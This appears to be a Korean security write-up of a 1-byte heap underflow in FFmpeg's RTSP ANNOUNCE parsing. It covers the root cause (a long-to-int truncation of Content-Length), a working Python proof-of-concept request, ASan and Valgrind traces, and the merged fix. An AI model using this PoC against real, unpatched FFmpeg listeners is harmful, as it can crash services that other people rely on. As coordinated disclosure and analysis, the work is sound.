# `avformat/rtspdec`: 1-byte heap-buffer-underflow in rtsp_read_announce

FFmpeg는 거의 모든 컨테이너·코덱·프로토콜을 다 다루는, 멀티미디어 분야에서 사실상 표준에 가까운 오픈소스 라이브러리다.
클라이언트 단말뿐 아니라 서버·게이트웨이·트랜스코더·녹화 파이프라인에 광범위하게 박혀 있어서 외부 노출 면적이 상당히 넓다.

방대한 코드베이스에 거의 다 C로 짜여 있다 보니, 붙잡아보면 한 건은 나오지 않을까 싶어 파보았다.

`libavcodec`, `libavformat`, `libavfilter` 등을 훑어보다가 `libavformat`의 RTSP 처리 코드에서 `-rtsp_flags listen`이라는 옵션이 눈에 들어왔다.
`libavformat/rtsp.c`의 옵션 테이블에 한 줄로 등록되어 있다.

```c
/* 97 */     { "listen", "wait for incoming connections", 0, AV_OPT_TYPE_CONST, {.i64 = RTSP_FLAG_LISTEN}, 0, 0, DEC, .unit = "rtsp_flags" },
```


**RTSP란?**

RTSP는 IP 카메라나 미디어 서버 같은 데서 스트림 세션을 제어하기 위한 텍스트 기반 프로토콜이다.
HTTP처럼 `DESCRIBE`, `SETUP`, `PLAY`, `ANNOUNCE`, `TEARDOWN` 같은 method를 클라이언트가 서버에 던지는 구조다.

ffmpeg는 보통 RTSP **클라이언트** 쪽으로 동작한다 — 외부 RTSP 서버에 붙어서 스트림을 받아오는 게 흔한 케이스.
그런데 이 옵션을 켜면 반대로 **ffmpeg 자체가 서버 노릇을 하면서 클라이언트의 요청을 받는** 모드가 된다.
미디어 게이트웨이나 recording proxy 시나리오에서 쓰인다. 
그러면 이 모드에선 클라이언트가 보낸 메시지를 어떻게 파싱하는지가 궁금해져서, `rtsp_listen()`과 그 안에서 호출되는 `rtsp_read_announce()`로 들어가서 알아보게 됐다. 
거기서 `Content-Length`를 처리하는 한 줄이 꼬롬한 것을 발견했다.

## 취약한 코드

`libavformat/rtspdec.c`의 `rtsp_read_announce()` 전체.

```c
/* 177 */ static int rtsp_read_announce(AVFormatContext *s)
/* 178 */ {
/* 179 */     RTSPState *rt             = s->priv_data;
/* 180 */     RTSPMessageHeader request = { 0 };
/* 181 */     char *sdp;
/* 182 */     int  ret;
/* 183 */
/* 184 */     ret = rtsp_read_request(s, &request, "ANNOUNCE");
/* 185 */     if (ret)
/* 186 */         return ret;
/* 187 */     rt->seq++;
/* 188 */     if (strcmp(request.content_type, "application/sdp")) {
/* 189 */         av_log(s, AV_LOG_ERROR, "Unexpected content type %s\n",
/* 190 */                request.content_type);
/* 191 */         rtsp_send_reply(s, RTSP_STATUS_SERVICE, NULL, request.seq);
/* 192 */         return AVERROR_OPTION_NOT_FOUND;
/* 193 */     }
/* 194 */     if (request.content_length) {
/* 195 */         sdp = av_malloc(request.content_length + 1);
/* 196 */         if (!sdp)
/* 197 */             return AVERROR(ENOMEM);
/* 198 */
/* 199 */         /* Read SDP */
/* 200 */         if (ffurl_read_complete(rt->rtsp_hd, sdp, request.content_length)
/* 201 */             < request.content_length) {
/* 202 */             av_log(s, AV_LOG_ERROR,
/* 203 */                    "Unable to get complete SDP Description in ANNOUNCE\n");
/* 204 */             rtsp_send_reply(s, RTSP_STATUS_INTERNAL, NULL, request.seq);
/* 205 */             av_free(sdp);
/* 206 */             return AVERROR(EIO);
/* 207 */         }
/* 208 */         sdp[request.content_length] = '\0';
/* 209 */         av_log(s, AV_LOG_VERBOSE, "SDP: %s\n", sdp);
/* 210 */         ret = ff_sdp_parse(s, sdp);
/* 211 */         av_free(sdp);
/* 212 */         if (ret)
/* 213 */             return ret;
/* 214 */         rtsp_send_reply(s, RTSP_STATUS_OK, NULL, request.seq);
/* 215 */         return 0;
/* 216 */     }
/* 217 */     av_log(s, AV_LOG_ERROR,
/* 218 */            "Content-Length header value exceeds sdp allocated buffer (4KB)\n");
/* 219 */     rtsp_send_reply(s, RTSP_STATUS_INTERNAL,
/* 220 */                     "Content-Length exceeds buffer size", request.seq);
/* 221 */     return AVERROR(EIO);
/* 222 */ }
```

이 함수에서 눈여겨볼 곳은 두 줄이다.

- 라인 195 — `sdp = av_malloc(request.content_length + 1)` 로 할당을 잡고,
- 라인 208 — `sdp[request.content_length] = '\0'` 로 본문 끝에 NUL을 박는다.

그리고 `request.content_length`는 `int`이고, 그 값은 `ff_rtsp_parse_line()` 안에서 `strtol()`로 헤더를 파싱한 결과가 그대로 들어간다.

## 분석

aarch64 Linux는 LP64라서 `int`는 32-bit, `long`은 64-bit.
그리고 `strtol()`은 `long`을 반환한다.

`Content-Length` 파싱은 `libavformat/rtsp.c`의 `ff_rtsp_parse_line()`에서 일어나고, 결과는 `RTSPMessageHeader.content_length` 필드에 들어간다.

```c
/* libavformat/rtsp.h — RTSPMessageHeader */
/* 130 */     /** length of the data following this header */
/* 131 */     int content_length;
```

```c
/* libavformat/rtsp.c — ff_rtsp_parse_line */
/* 1147 */     } else if (av_stristart(p, "Content-Length:", &p)) {
/* 1148 */         reply->content_length = strtol(p, NULL, 10);
```

`strtol`이 돌려준 `long`이 곧장 `int` 필드에 대입되는 구조다.
한쪽이 64-bit, 한쪽이 32-bit이라서 값이 `int` 범위를 넘는 순간 잘려 들어간다.

클라이언트가 `Content-Length: 2³² − 1 (= 4294967295)`를 보내면, `strtol()`은 일단 `4294967295L`을 그대로 돌려준다 — 64-bit long에는 정상으로 들어가는 값이라 여기서는 사고가 안 난다.
사고는 그 결과를 `int` 필드에 대입하는 라인 1148이다.
32-bit로 잘리면서 비트 패턴이 `0xFFFFFFFF`이 되고, signed int로 해석되면 **`-1`**이 된다.

이제 `request.content_length == -1`인 상태가 됐다.
0이 아니므로 `rtspdec.c` 라인 194의 `if (request.content_length)` 분기는 정상적으로 통과하고, 라인 195의 `av_malloc(content_length + 1)` — 즉 `av_malloc(0)`이 호출된다.

상식적으로는 `av_malloc(0)`이 NULL을 줘야 할 것 같지만, FFmpeg의 `av_malloc()`은 그렇게 동작하지 않는다.
`libavutil/mem.c`의 구현을 보면 답이 나온다.

```c
/* libavutil/mem.c — av_malloc */
/* 106 */     if (size) //OS X on SDK 10.6 has a broken posix_memalign implementation
/* 107 */     if (posix_memalign(&ptr, ALIGN, size))
/* 108 */         ptr = NULL;
/* ... */
/* 144 */     if(!ptr && !size) {
/* 145 */         size = 1;
/* 146 */         ptr= av_malloc(1);
/* 147 */     }
```

라인 106의 `if (size)` 가드가 있어서 `size == 0`이면 `posix_memalign` 호출 자체를 건너뛴다 — 그래서 `ptr`은 NULL인 채로 내려간다.
그러면 라인 144에서 `!ptr && !size`가 참이 되고, `size = 1; ptr = av_malloc(1);` 로 자기 자신을 1바이트 짜리로 재호출한다.
즉 `av_malloc(0)`이 돌려주는 건 NULL이 아니라 유효한 **1바이트 영역**을 가리키는 포인터다.

그 상태에서 라인 208이 실행된다.

```c
/* 208 */         sdp[request.content_length] = '\0';
```

`sdp[request.content_length]`는 결국 `sdp[-1]`.
`sdp`가 가리키는 1바이트 영역의 **시작 주소 직전 1바이트**에 NUL이 박힌다.
1-byte heap-buffer-underflow다.

## PoC

별도 미디어 파일은 필요 없고 RTSP `ANNOUNCE` 요청 한 번으로 트리거 할 수 있다.

```python
#!/usr/bin/env python3

import argparse
import socket


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=8554)
    parser.add_argument("--value", default="4294967295")
    parser.add_argument("--path", default="poc")
    parser.add_argument("--body", default="v=0\r\n")
    args = parser.parse_args()

    request = (
        f"ANNOUNCE rtsp://{args.host}:{args.port}/{args.path} RTSP/1.0\r\n"
        f"CSeq: 1\r\n"
        f"Content-Type: application/sdp\r\n"
        f"Content-Length: {args.value}\r\n"
        f"\r\n"
    ).encode("latin1") + args.body.encode("latin1")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((args.host, args.port))
    sock.sendall(request)

    try:
        data = sock.recv(4096)
        print(data.decode("latin1", "ignore"))
    except OSError as exc:
        print(exc)
    finally:
        sock.close()


if __name__ == "__main__":
    main()
```

구성을 짚어보면:

- `--value` — RTSP 요청의 `Content-Length` 헤더로 들어가는 값. 기본값 `4294967295` (= 2³² − 1).
- `--body` — TCP 본문에 같이 실어 보낼 페이로드. 기본값 `v=0\r\n` 은 RFC 4566 SDP의 첫 줄(`v=` 버전 선언)이다. 다만 underflow는 ffmpeg가 본문을 실제로 파싱하기 전 단계에서 터지기 때문에 본문 내용 자체는 트리거에 영향이 없고, 형식상 SDP 한 줄을 넣어둔 것일 뿐이다.
- 요청 조립은 별도 RTSP 클라이언트 라이브러리 없이 socket으로 raw RTSP 평문을 직접 만든다. 메서드 `ANNOUNCE`에 필수 헤더 세 개(`CSeq`, `Content-Type: application/sdp`, `Content-Length`)만 채우면 ffmpeg의 listen-mode ANNOUNCE 분기에 정상 진입한다.
- 진짜 트리거는 `Content-Length: {args.value}` 한 줄. 나머지 헤더와 본문은 그 분기를 타고 라인 208까지 도달하기 위한 장식일 뿐이다.

마지막 `sock.recv(4096)`로 응답을 받으러 가지만, affected 빌드라면 그 사이 ffmpeg는 라인 208의 underflow를 맞고 ASan abort로 죽어 있다 — `recv()`는 EOF를 받고 빈 문자열이 출력될 가능성이 높다.

서버 쪽:

```bash
./ffmpeg_g -rtsp_flags listen -listen_timeout 10 \
           -i rtsp://127.0.0.1:8579/poc -f null -
```

PoC 한번으로 `ANNOUNCE`만 받으면 트리거된다.

## ASan 출력

```text
=================================================================
==14140==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffa8e006cf at pc 0xaaaab9d15044 bp 0xffffda4ce160 sp 0xffffda4ce150
WRITE of size 1 at 0xffffa8e006cf thread T0
    #0 0xaaaab9d15040 in rtsp_read_announce libavformat/rtspdec.c:208
    #1 0xaaaab9d1ada0 in rtsp_listen libavformat/rtspdec.c:817
    #2 0xaaaab9d1b284 in rtsp_read_header libavformat/rtspdec.c:860
    #3 0xaaaab98b4f24 in avformat_open_input libavformat/demux.c:323
    #4 0xaaaab8b18e04 in ifile_open fftools/ffmpeg_demux.c:2155
    #5 0xaaaab8b79144 in open_files fftools/ffmpeg_opt.c:1465
    #6 0xaaaab8b79690 in ffmpeg_parse_options fftools/ffmpeg_opt.c:1514
    #7 0xaaaab8bd4884 in main fftools/ffmpeg.c:1009
    #8 0xffffac2773fc in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #9 0xffffac2774d4 in __libc_start_main_impl ../csu/libc-start.c:392
    #10 0xaaaab8af24ec in _start (/analyze/FFmpeg/ffmpeg+0x5c24ec)

0xffffa8e006cf is located 1 bytes to the left of 1-byte region [0xffffa8e006d0,0xffffa8e006d1)
allocated by thread T0 here:
    #0 0xffffaccb0140 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
    #1 0xaaaabca48858 in av_malloc libavutil/mem.c:107
    #2 0xaaaabca488cc in av_malloc libavutil/mem.c:146
    #3 0xaaaab9d14ddc in rtsp_read_announce libavformat/rtspdec.c:195
    #4 0xaaaab9d1ada0 in rtsp_listen libavformat/rtspdec.c:817
    #5 0xaaaab9d1b284 in rtsp_read_header libavformat/rtspdec.c:860
    #6 0xaaaab98b4f24 in avformat_open_input libavformat/demux.c:323
    #7 0xaaaab8b18e04 in ifile_open fftools/ffmpeg_demux.c:2155
    #8 0xaaaab8b79144 in open_files fftools/ffmpeg_opt.c:1465
    #9 0xaaaab8b79690 in ffmpeg_parse_options fftools/ffmpeg_opt.c:1514
    #10 0xaaaab8bd4884 in main fftools/ffmpeg.c:1009
    #11 0xffffac2773fc in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #12 0xffffac2774d4 in __libc_start_main_impl ../csu/libc-start.c:392
    #13 0xaaaab8af24ec in _start (/analyze/FFmpeg/ffmpeg+0x5c24ec)

SUMMARY: AddressSanitizer: heap-buffer-overflow libavformat/rtspdec.c:208 in rtsp_read_announce
Shadow bytes around the buggy address:
  0x200ff51c0080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c0090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c00a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c00b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c00c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x200ff51c00d0: fa fa fa fa fa fa fa fa fa[fa]01 fa fa fa fa fa
  0x200ff51c00e0: fd fd fa fa fa fa fd fd fd fa fa fa fd fd fa fa
  0x200ff51c00f0: fa fa fd fd fd fa fa fa fd fa fa fa fa fa fd fd
  0x200ff51c0100: fa fa fa fa fd fd fd fa fa fa fd fd fa fa fa fa
  0x200ff51c0110: fd fd fd fa fa fa fd fd fa fa fa fa fd fd fd fa
  0x200ff51c0120: fa fa fd fd fa fa fa fa fd fd fd fa fa fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==14140==ABORTING
```

주소부터 보면 write 위치가 `0xffffa8e006cf`이고 할당 영역은 `[0xffffa8e006d0, 0xffffa8e006d1)` — 닫힌 표기로 정확히 **1바이트짜리 영역**이다.
write는 그 시작 주소보다 **1바이트 앞**에 떨어진다.
분석에서 따라온 `sdp[-1]`이 ASan에 그대로 잡힌 셈이다.

콜스택을 보면 write의 첫 프레임은 `rtsp_read_announce libavformat/rtspdec.c:208`, allocation의 첫 프레임은 같은 함수의 `:195`다.
라인 195가 `sdp = av_malloc(request.content_length + 1)` 자리, 라인 208이 `sdp[request.content_length] = '\0'` 자리 — 코드 따라가며 짠 시나리오가 ASan 트레이스로 한 글자도 다르지 않게 검증된다.

마지막은 shadow map 부분이다.
좀 추상적인 개념이라 그림으로 풀어보면 이해가 쉽다.

**Shadow byte** 는 ASan이 힙을 추적하는 방식이다.
실제 힙 **8바이트마다 1바이트의 shadow** 를 따로 두고, 그 한 바이트 값으로 해당 8바이트 영역의 상태를 표현한다.

| shadow 값 | 의미 |
|---|---|
| `00` | 8바이트 전부 valid (정상 할당 영역) |
| `01` ~ `07` | 앞쪽 N바이트만 valid, 나머지는 unaddressable |
| `fa` | 통째로 redzone — 할당 영역 옆에 일부러 둔 차단 구간 |

abort 출력의 화살표(`=>`) 줄을 다시 보면:

```text
=>0x200ff51c00d0: fa fa fa fa fa fa fa fa fa[fa]01 fa fa fa fa fa
```

주목할 부분은 가운데 `[fa]` 와 그 다음 칸 `01` 두 자리다.
각 shadow 1바이트가 힙 8바이트를 커버하니까 두 칸을 풀면 이런 그림이 된다.

```text
shadow byte:    ...    [fa]                  01                ...
                        │                     │
                        │  (각 shadow 1바이트 = 힙 8바이트)
                        ▼                     ▼
heap 영역:       ┌────────────────────┬────────────────────────┐
                │  8B 전부 redzone    │ 1B valid + 7B 미사용     │
                └────────────────────┴────────────────────────┘
                 0xffffa8e006c8        0xffffa8e006d0
                                ↑          ↑
                          0xffffa8e006cf    0xffffa8e006d0
                          = write 주소      = 우리가 받은 1B 할당의 시작
                          = sdp[-1]         = sdp
```

`[fa]` 가 커버하는 redzone 8바이트 중 **마지막 바이트** 가 정확히 write 주소 `0xffffa8e006cf` 이고, 바로 다음 칸 `01` 이 커버하는 8바이트 중 **첫 1바이트** 가 우리 할당의 시작 `0xffffa8e006d0` 이다.
즉 shadow map은 "1바이트 할당의 시작 직전, redzone의 끝 바이트에 1바이트 write가 떨어졌다" 는 그림을 ASan이 미리 그려둔 셈이다.

## Valgrind 결과

ASan 없는 별도 debug 빌드에서 Memcheck로도 돌렸다.
같은 underflow가 잡히고, Valgrind는 동일한 사실을 다른 워딩으로 보고한다("1 byte before a block of size 1").

```text
==27946== Invalid write of size 1
==27946==    at 0x8D66D4: rtsp_read_announce (rtspdec.c:208)
...
==27946==  Address 0x52b4eef is 1 bytes before a block of size 1 alloc'd
==27946==    by 0x19AA667: av_malloc (mem.c:107)
==27946==    by 0x19AA69B: av_malloc (mem.c:146)
==27946==    by 0x8D6643: rtsp_read_announce (rtspdec.c:195)
```

여기서 Valgrind가 추가로 잡아주는 게 있다.
그 1바이트 underflow 외에도, 직후 코드 경로에서 **uninitialised value 3건**이 더 보고된다.

라인 209 — `av_log` 경로 안의 `strlen`이 uninit 메모리를 읽는다.

```text
==27946== Conditional jump or move depends on uninitialised value(s)
==27946==    at 0x486B2A8: __GI_strlen
==27946==    by ... __vfprintf_internal / vsnprintf
==27946==    by ... av_vbprintf / format_line / av_log_default_callback
==27946==    by 0x8D66EF: rtsp_read_announce (rtspdec.c:209)
```

라인 210 — `ff_sdp_parse()` 안의 `strspn`도 동일한 uninit 영역 위에서 conditional jump.

```text
==27946== Conditional jump or move depends on uninitialised value(s)
==27946==    at 0x4870478: strspn
==27946==    by 0x8CF8EB: ff_sdp_parse (rtsp.c:761)
==27946==    by 0x8D66FB: rtsp_read_announce (rtspdec.c:210)
```

정리하면 — 핵심 primitive는 라인 208의 `sdp[-1] = '\0'` 1바이트지만, 그 자리에서 끝나는 게 아니다.

- 라인 208 — `sdp[-1]`에 NUL 1바이트 박힘 (실제 underflow)
- 라인 209 — 그 뒤 `av_log()` 호출 경로의 포맷 처리 중 `strlen`이 NUL 종료 안 된 영역을 읽음
- 라인 210 — `ff_sdp_parse()`가 같은 영역 위에서 `strspn` 등을 돌리며 conditional jump

즉 1바이트 손상 자체로 끝나지 않고, 그 직후 로깅·SDP 파싱 경로 전체가 unsanitized 메모리에 의해 휩쓸린다. 마치 파도.
"1바이트는 별거 아닌거 아님?" 이라고 하기엔 후속 흐름이 산만하다.

## 패치

위 내용을 정리해서 FFmpeg 메인테이너에게 제보했고, [PR #22902](https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/22902)로 다음과 같이 수정되어 머지됐다.
비슷한 시기에 해당 취약점을 제보한 사람이 한명 더 있었다는데 내가 이겼다. 😎

패치된 내용은 다음과 같다.

```diff
--- a/libavformat/rtspdec.c
+++ b/libavformat/rtspdec.c
@@ -191,7 +191,7 @@
         rtsp_send_reply(s, RTSP_STATUS_SERVICE, NULL, request.seq);
         return AVERROR_OPTION_NOT_FOUND;
     }
-    if (request.content_length) {
+    if (request.content_length > 0) {
         sdp = av_malloc(request.content_length + 1);
         if (!sdp)
             return AVERROR(ENOMEM);
@@ -215,10 +215,10 @@
         return 0;
     }
     av_log(s, AV_LOG_ERROR,
-           "Content-Length header value exceeds sdp allocated buffer (4KB)\n");
+           "Invalid ANNOUNCE Content-Length %d\n", request.content_length);
     rtsp_send_reply(s, RTSP_STATUS_INTERNAL,
-                    "Content-Length exceeds buffer size", request.seq);
-    return AVERROR(EIO);
+                    "Invalid Content-Length", request.seq);
+    return AVERROR_INVALIDDATA;
 }
```

`if (request.content_length)` → `if (request.content_length > 0)` 로 바뀌면서, 이전엔 `0`만 거르고 음수는 그대로 통과시켰던 게 이제 양수가 아닌 모든 값을 같이 떨어뜨리게 되었다.
우리가 보낸 `Content-Length: 2³² − 1 (= 4294967295)` → `int -1` 케이스도 여기서 바로 fail 처리되어 `av_malloc`을 호출조차 하지 않는다.

else 분기(원래는 "Content-Length header value exceeds sdp allocated buffer (4KB)"라는 약간 부정확한 에러를 뱉던 자리)의 메시지와 반환 코드도 같이 정리됐다.
`AVERROR(EIO)` → `AVERROR_INVALIDDATA`로 의미를 맞추고, 로그에는 잘못된 실제 값(`%d`)을 그대로 출력하도록 바꿨다.

